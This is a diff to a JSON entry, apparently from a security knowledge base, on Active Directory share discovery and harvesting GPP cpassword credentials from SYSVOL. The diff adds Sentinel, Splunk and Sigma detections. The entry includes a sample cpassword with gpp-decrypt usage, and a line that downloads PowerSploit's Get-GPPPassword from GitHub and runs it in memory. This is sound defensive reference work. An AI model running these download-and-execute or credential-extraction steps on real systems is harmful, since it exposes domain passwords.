@@ -114,7 +114,70 @@
     ],
     "misconfiguration": "GPP XML files with cpassword attribute still in SYSVOL (from pre-MS14-025 GPO creation). Sensitive scripts in SYSVOL. Non-standard shares with weak permissions. No monitoring of bulk SYSVOL access.",
     "vulnerable_config": "# GPP cpassword in SYSVOL (legacy - still present if never cleaned up):\n# \\\\corp.local\\SYSVOL\\corp.local\\Policies\\{GUID}\\Machine\\Preferences\\Groups\\Groups.xml\n# <Properties action='U' newName='' fullName='' description=''\n#   cpassword='edBSHOwhZLTjt/QS9FeIcJ8m9MZfl7QEVF6vMJopZhI=' ...>\n# → gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ8m9MZfl7QEVF6vMJopZhI=' → cleartext password",
-    "secure_config": "# Find and remove GPP cpassword files:\nGet-ChildItem -Path '\\\\corp.local\\SYSVOL' -Recurse -Include '*.xml' | Select-String 'cpassword'\n# Remove any files found OR remove the cpassword element\n\n# Microsoft KB2962486 (MS14-025) prevents NEW GPP passwords but doesn't remove old ones:\n# Must manually audit and clean SYSVOL\n\n# SIEM alert for GPP cpassword access:\n# Event 5140: ObjectName contains 'Groups.xml' OR 'DataSources.xml' OR 'ScheduledTasks.xml'\n# AND AccessMask=0x80 (read) → ALERT\n\n# Audit SYSVOL regularly:\nInvoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1')\nGet-GPPPassword"
+    "secure_config": "# Find and remove GPP cpassword files:\nGet-ChildItem -Path '\\\\corp.local\\SYSVOL' -Recurse -Include '*.xml' | Select-String 'cpassword'\n# Remove any files found OR remove the cpassword element\n\n# Microsoft KB2962486 (MS14-025) prevents NEW GPP passwords but doesn't remove old ones:\n# Must manually audit and clean SYSVOL\n\n# SIEM alert for GPP cpassword access:\n# Event 5140: ObjectName contains 'Groups.xml' OR 'DataSources.xml' OR 'ScheduledTasks.xml'\n# AND AccessMask=0x80 (read) → ALERT\n\n# Audit SYSVOL regularly:\nInvoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1')\nGet-GPPPassword",
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "AD Enumeration - Domain Share Discovery & SYSVOL Hunting - Sentinel",
+        "logic": "DeviceEvents\n| where ActionType == \"PowerShellCommand\"\n| where ProcessCommandLine has_any (\"Find-DomainShare\", \"Invoke-ShareFinder\")\n| project Timestamp, DeviceName, InitiatingProcessAccountName, ProcessCommandLine\n| sort by Timestamp desc",
+        "data_source": "powershell",
+        "attack": [
+          "T1135",
+          "T1552.006"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      },
+      {
+        "platform": "splunk",
+        "name": "AD Enumeration - Domain Share Discovery & SYSVOL Hunting - Splunk",
+        "logic": "index=wineventlog EventCode=4104 (ScriptBlockText=\\\"*Find-DomainShare*\\\" OR ScriptBlockText=\\\"*Invoke-ShareFinder*\\\")\n| table _time, Computer, User, ScriptBlockText",
+        "data_source": "powershell",
+        "attack": [
+          "T1135",
+          "T1552.006"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "log_ids": [
+          "4104"
+        ]
+      },
+      {
+        "platform": "sigma",
+        "name": "posh_ps_powerview_share_recon",
+        "logic": "posh_ps_powerview_share_recon",
+        "data_source": "windows-security",
+        "attack": [
+          "T1135",
+          "T1552.006"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      },
+      {
+        "platform": "sigma",
+        "name": "win_security_ldap_recon",
+        "logic": "win_security_ldap_recon",
+        "data_source": "windows-security",
+        "attack": [
+          "T1135",
+          "T1552.006"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      }
+    ],
+    "visibility": {
+      "requires": [
+        "powershell",
+        "windows-security"
+      ],
+      "better_with": [
+        "edr",
+        "sysmon"
+      ]
+    }
   },
   "explain": "Discovers domain shares and hunts SYSVOL for GPP passwords:\n  Find-DomainShare                        enumerate accessible SMB shares across every domain computer\n  ls \\\\<dc_host>\\sysvol\\<domain>\\Policies\\   browse the replicated policy files\nGPP files (Groups.xml etc.) can hold AES-encrypted cpassword values whose key Microsoft published - decrypt with gpp-decrypt for instant credentials; recurse and grep for Groups.xml/Services.xml/ScheduledTasks.xml."
 }
